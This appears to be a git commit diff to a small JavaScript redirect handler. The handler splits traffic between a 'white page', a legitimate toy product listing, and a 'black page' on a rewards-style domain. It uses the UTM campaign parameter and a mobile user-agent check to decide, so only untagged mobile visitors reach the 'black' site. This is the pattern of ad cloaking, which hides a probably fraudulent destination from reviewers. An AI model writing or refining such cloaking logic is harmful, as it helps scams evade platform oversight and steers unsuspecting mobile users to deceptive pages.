309debfb64e28f801894c84678f1092ecc151cc9
Ayden Xu <aydenxunc@gmail.com>
2024-12-26 00:37:14 -0500

    mixueps

--- api/redirect.js
+++ api/redirect.js
@@ -1,27 +1,27 @@
 export default function handler(req, res) {
-    // URLs to redirect
-    const whitePageURL = "";
-    const blackPageURL = "https://rwrds.wiki";
-  
-    // Parse the UTM parameters from the request URL
-    const queryParams = new URLSearchParams(req.url.split('?')[1]);
-    const utmCampaign = queryParams.get('utm_campaign');
-  
-    // Get the User-Agent from the request headers
-    const userAgent = req.headers['user-agent'] || '';
-    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  
-    // Redirection logic
-    if (utmCampaign === '__AID_NAME__') {
-      // UTM campaign 'l1' takes priority for both desktop and mobile
-      res.writeHead(302, { Location: whitePageURL });
-    } else if (isMobileDevice) {
-      // Mobile devices without 'l1' campaign
-      res.writeHead(302, { Location: blackPageURL });
-    } else {
-      // Desktop devices without 'l1' campaign
-      res.writeHead(302, { Location: whitePageURL });
-    }
-  
-    res.end();
+  // URLs to redirect
+  const whitePageURL = "  https://gund.com/collections/bears/products/jumbo-philbin";
+  const blackPageURL = "https://rwrds.live";
+
+  // Parse the UTM parameters from the request URL
+  const queryParams = new URLSearchParams(req.url.split('?')[1]);
+  const utmCampaign = queryParams.get('utm_campaign');
+
+  // Get the User-Agent from the request headers
+  const userAgent = req.headers['user-agent'] || '';
+  const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+
+  // Redirection logic
+  if (utmCampaign && utmCampaign.length > 0) {
+    // UTM campaign 'l1' takes priority for both desktop and mobile
+    res.writeHead(302, { Location: whitePageURL });
+  } else if (isMobileDevice) {
+    // Mobile devices without 'l1' campaign
+    res.writeHead(302, { Location: blackPageURL });
+  } else {
+    // Desktop devices without 'l1' campaign
+    res.writeHead(302, { Location: whitePageURL });
   }
+
+  res.end();
+}
